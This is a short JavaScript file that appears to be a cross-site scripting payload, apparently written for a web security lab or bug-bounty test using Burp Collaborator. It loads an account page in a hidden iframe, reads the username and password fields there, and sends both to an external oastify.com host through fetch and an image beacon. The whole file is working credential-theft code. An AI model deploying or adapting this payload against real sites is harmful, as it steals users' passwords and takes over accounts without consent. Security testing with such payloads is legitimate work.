// life.js - Fixed version
(function() {
    // Wait for DOM to be ready
    function init() {
        alert('Step 1: Starting password extraction...');
        
        // Create hidden iframe
        var iframe = document.createElement('iframe');
        iframe.src = '/web/guest/add';
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        
        iframe.onload = function() {
            alert('Step 2: Password page loaded!');
            
            setTimeout(function() {
                try {
                    var username = iframe.contentDocument.querySelector('input[name="fake_username"]').value;
                    var password = iframe.contentDocument.querySelector('input[name="fake_password"]').value;
                    
                    alert('🔑 Password: ' + password);
                    
                    var collab = 'https://m9wvitwtgk19gvfaojwmvuxw7nde15pu.oastify.com';
                    fetch(collab + '/?user=' + encodeURIComponent(username) + '&pwd=' + encodeURIComponent(password));
                    new Image().src = collab + '/?user=' + encodeURIComponent(username) + '&pwd=' + encodeURIComponent(password);
                    
                    alert('✅ Sent to Burp Collaborator!');
                    
                } catch(e) {
                    alert('❌ Error: ' + e.message);
                }
            }, 3000);
        };
    }
    
    // Wait for DOM
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        // DOM already loaded
        init();
    }
})();
